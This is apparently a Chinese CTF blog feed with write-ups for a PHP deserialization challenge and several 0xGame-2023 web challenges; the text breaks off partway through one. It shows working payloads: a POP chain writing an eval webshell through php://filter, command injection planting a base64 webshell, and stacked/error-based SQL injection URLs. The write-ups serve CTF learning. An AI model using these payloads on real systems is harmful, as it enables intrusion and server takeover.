title="[WEEK3]sseerriiaalliizzee"></a>[WEEK3]sseerriiaalliizzee</h3><p>Áü•ËØÜÁÇπÔºöÂèçÂ∫èÂàóÂåñ„ÄÅfile_put_contentsÂà©Áî®<br>ÊñáÁ´†ÂàÜ‰∫´Ôºö<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">Ë∞à‰∏ÄË∞àphp:&#x2F;&#x2F;filterÁöÑÂ¶ôÁî®</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$barking</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">-></span><span class="token function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$part1</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$part2</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part1</span> <span class="token operator">=</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part2</span> <span class="token operator">=</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$useless</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("+Genshin Impact Start!+");?>'</span><span class="token punctuation">;</span>        <span class="token variable">$useful</span><span class="token operator">=</span> <span class="token variable">$useless</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">part2</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">part1</span><span class="token punctuation">,</span><span class="token variable">$useful</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./flag,php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"barking for fun!"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no way, fuck off"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰∏≤Â•ΩÈìæÂ≠êÔºö</p><blockquote><p>Start-&gt;CTF-&gt;Flag</p></blockquote><p>exp:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$barking</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">-></span><span class="token function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$part1</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$part2</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part1</span> <span class="token operator">=</span> <span class="token variable">$part1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">part2</span> <span class="token operator">=</span> <span class="token variable">$part2</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$useless</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("+Genshin Impact Start!+");?>'</span><span class="token punctuation">;</span>        <span class="token variable">$useful</span><span class="token operator">=</span> <span class="token variable">$useless</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">part2</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span> <span class="token property">part1</span><span class="token punctuation">,</span><span class="token variable">$useful</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dosomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./flag,php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"barking for fun!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CTF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">barking</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">part1</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">part2</span><span class="token operator">=</span><span class="token string single-quoted-string">'PD8gZXZhbCgkX1BPU1RbMV0pOw=='</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame-2023</title>
      <link href="/2023/10/06/0xGame-2023/"/>
      <url>/2023/10/06/0xGame-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="Week-1-signin"><a href="#Week-1-signin" class="headerlink" title="[Week 1] signin"></a>[Week 1] signin</h2><p>F12Êü•ÁúãÊ∫êÁ†ÅÔºåmain.jsÊñá‰ª∂ÈáåÊúâflag<br><img src="https://img-blog.csdnimg.cn/0f8d7e6202574ec0a759d419ed97bf7b.png" alt="1"></p><h2 id="Week-1-baby-php"><a href="#Week-1-baby-php" class="headerlink" title="[Week 1] baby_php"></a>[Week 1] baby_php</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// flag in flag.php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÖàËøõË°åÊï∞ÁªÑÁªïËøáa,b„ÄÇnameÂèØ‰ª•‰ΩøÁî®php‰º™ÂçèËÆÆËøõË°åËØªÂèñ<code>php://filter/convert.base64-encode/resource=flag</code>„ÄÇ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1024</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>c‰º†ÂÖ•1024.1aÂç≥ÂèØÁªïËøá„ÄÇ</p><h2 id="Week-1-hello-http"><a href="#Week-1-hello-http" class="headerlink" title="[Week 1] hello_http"></a>[Week 1] hello_http</h2><p>ÈóÆ‰Ω†Âï•‰Ω†ÂÜôÂï•Â∞±Ë°å‰∫Ü„ÄÇ„ÄÇ„ÄÇ</p><h2 id="Week-1-ping"><a href="#Week-1-ping" class="headerlink" title="[Week 1] ping"></a>[Week 1] ping</h2><p><img src="https://img-blog.csdnimg.cn/4a66a3f4f0c949cc82de767ad82aa088.png" alt="1"><br>ÊòØ‰∏Ä‰∏™pingÈ¢òÁõÆÔºåÊü•ÁúãÊ∫êÁ†Å<br><strong>&#x2F;api.php?source</strong><br><img src="https://img-blog.csdnimg.cn/d5e483c94b15420989adff91a42f44bb.png" alt="1"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$s</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No IP Address'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/((\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])/'</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//Â∞±ÊòØËæ®Âà´ipÂú∞ÂùÄÂçÅËøõÂà∂ÊòØÂê¶ÂêàÊ≥ï</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid IP Address'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ping -c 4 '</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span> <span class="token string single-quoted-string">' 2>&amp;1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÈáçÁÇπÊòØip‰º†ÂÖ•ÁöÑÂÄº<br><img src="https://img-blog.csdnimg.cn/0000633d27ea4222bd497e48dc1922be.png" alt="2"><br>‰πüÂèØ‰ª•‰ΩøÁî®<code>ip=127.0.0.1|ls``ip=127.0.0.10000||ls</code><br><img src="https://img-blog.csdnimg.cn/480d98ce0ba9467fa140c77c5dd89dd9.png" alt="1"><br>Áî±‰∫éËøáÊª§ÁöÑÊúâÂÜÖÂÆπÔºåÁ©∫Ê†ºÂèØ‰ΩøÁî®<code>$&#123;IFS&#125;</code>‰ª£ÊõøÔºå‰ΩøÁî®base64ÁºñÁ†ÅÂÜôÂÖ•‰∏ÄÂè•ËØùÊú®È©¨</p><blockquote><p><code>echo$&#123;IFS&#125;PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0ZiddKTsgPz4=|base64$&#123;IFS&#125;-d&gt;&gt;513.php</code></p></blockquote><p>ËøûÊé•ËöÅÂâëÊãøÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/f521f056cd724f2f8e85d9b2a945a12f.png" alt="1"></p><h2 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h2><p>Áü•ËØÜÁÇπÔºöSQLÊ≥®ÂÖ•ÔºàÂ†ÜÂè†Ê≥®ÂÖ•„ÄÅÊä•ÈîôÊ≥®ÂÖ•„ÄÅÈ¢ÑÂ§ÑÁêÜÔºâ<br>ÊèêÁ§∫Ôºö<br><img src="https://img-blog.csdnimg.cn/ea2dbfeb1c804919a79f91fb8cd2e71c.png" alt="1"><br>Êü•ÁúãÁ¶ÅÁî®ÂáΩÊï∞,fuzz‰∏Ä‰∏ãÔºåÂèëÁé∞‰ª•‰∏ãÂ≠óÁ¨¶Ë¢´ËøáÊª§„ÄÇ<br><img src="https://img-blog.csdnimg.cn/a575a24b97be4713ba7423ed92ff0f9e.png" alt="1"></p><p><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQLÁöÑSQLÈ¢ÑÂ§ÑÁêÜ(Prepared)</a><br><a href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQLÊ≥®ÂÖ•ÂÆûÊàò‰πãÊä•ÈîôÊ≥®ÂÖ•ÁØáÔºàupdatexml extractvalue floorÔºâ</a></p><p>ÂÄü‰∏Ä‰ΩçÂ∏àÂÇÖÁöÑËÑöÊú¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C646174616261736528292929;prepare/**/aaa/**/from @c;execute/**/aaa;</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> Group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> table_schema <span class="token operator">=</span> <span class="token string">'ctf'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2853454C4543542047726F75705F636F6E636174287461626C655F6E616D65292046524F4D20696E666F726D6174696F6E5F736368656D612E7461626C6573205748455245207461626C655F736368656D61203D2027637466272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span>MySQLdb<span class="token punctuation">.</span>OperationalError: <span class="token punctuation">(</span><span class="token number">1105</span><span class="token punctuation">,</span> <span class="token string">"XPATH syntax error: '~~flag,userinfo'"</span><span class="token punctuation">)</span><span class="token keyword">select</span> hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctf' and table_name='flag')));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C2873656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F736368656D613D276374662720616E64207461626C655F6E616D653D27666C6167272929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>first_name<span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>last_name<span class="token punctuation">)</span> <span class="token keyword">from</span> dvwa<span class="token punctuation">.</span>users<span class="token punctuation">)</span><span class="token punctuation">)</span>hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,(select flag from ctf.flag)));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hex<span class="token punctuation">(</span><span class="token string">"select extractvalue(1,concat(0x7e,0x7e,substr((select flag from ctf.flag),29,30)));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">0</span>xGame&#123;<span class="token number">4286</span>b62d<span class="token operator">-</span>c37e<span class="token operator">-</span><span class="token number">4010</span><span class="token operator">-</span>ba9c<span class="token operator">-</span><span class="token number">35</span>d47641fb91&#125;http:<span class="token comment">//124.71.184.68:50021/?order=id;set/**/@c=0x73656C656374206578747261637476616C756528312C636F6E63617428307837652C307837652C737562737472282873656C65637420666C61672066726F6D206374662E666C6167292C32392C33302929293B;prepare/**/aaa/**/from @c;execute/**/aaa;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h2><p>ËÄÉÁÇπÔºöphpÂèçÂ∫èÂàóÂåñpopÈìæÊûÑÈÄ†„ÄÅwakeupÁöÑÁªïËøá„ÄÇ<br>‰∏ç‰ºöÔºåÁúãÁöÑÂÆòÊñπwp„ÄÇ„ÄÇ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/4e1821de9476443b80fcf1ee06488bd7.png" alt="ÊèêÁ§∫"><br>Ë¥¥‰∏äÊ∫êÁ†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Cache</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$expired</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">helper</span> <span class="token operator">=</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expired</span> <span class="token operator">=</span> <span class="token constant 